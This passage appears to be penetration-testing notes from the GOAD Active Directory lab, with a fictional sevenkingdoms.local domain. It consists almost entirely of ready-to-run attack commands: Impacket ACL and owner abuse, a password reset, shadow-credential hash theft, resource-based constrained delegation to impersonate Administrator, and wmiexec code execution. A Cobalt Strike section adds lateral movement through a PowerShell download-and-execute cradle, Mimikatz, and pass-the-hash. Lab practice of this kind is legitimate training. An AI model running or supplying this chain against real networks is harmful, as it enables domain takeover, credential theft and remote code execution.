python3 impacket/examples/owneredit.py -action write -new-owner 'tyron.lannister' -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
```

Edit ACL
```
python3 impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal tyron.lannister -target 'kingsguard' 'sevenkingdoms.local'/'tyron.lannister' -hashes ':b3b3717f7d51b37fb325f7e7d048e998'
```

Add self to group:
```
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=kingsguard,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

Change password of stannis (genericall):
```
net rpc password stannis.baratheon --pw-nt-hash -U sevenkingdoms.local/tyron.lannister%b3b3717f7d51b37fb325f7e7d048e998 -S kingslanding.sevenkingdoms.local
test111
```

Get NT hash for kingslanding:
```
certipy-ad shadow auto -u stannis.baratheon@sevenkingdoms.local -p 'test111' -account 'kingslanding'
[*] NT hash for 'KINGSLANDING$': fb60bb636d5a086d490a019ca0a08317
```

Or we can do:
```
impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host sevenkingdoms.local -domain-netbios sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:test111'
```

```
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'stannis.baratheon' -action 'write' 'sevenkingdoms.local/stannis.baratheon:test111'
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'kingslanding$' -action 'write' 'sevenkingdoms.local/stannis.baratheon:test111'
```

Impersonate admin:
```
impacket-getST -self -altservice 'cifs/kingslanding.sevenkingdoms.local' -impersonate 'Administrator' -k -no-pass -dc-ip 192.168.56.10 'sevenkingdoms.local/kingslanding$'
```

Exploit:
```
impacket-wmiexec -k -no-pass -dc-ip 192.168.56.10 'sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local' whoami
```

## GOAD with Cobalt strike

Lateral movement:
```
powerpick Invoke-Command -ComputerName WINTERFELL -ScriptBlock { iex(New-Object net.webclient).DownloadString('http://192.168.56.112:8081/test2.ps1') }
```

Mimikatz:
```
powershell-import /home/kali/goad/Invoke-Mimikatz.ps1
```

Mimikatz steal token:
```
mimikatz sekurlsa::pth /user:"robb.stark" /domain:"NORTH" /ntlm:d977b98c6c9282c5c478be1d97b237b8 /run:"powershell -w hidden"
```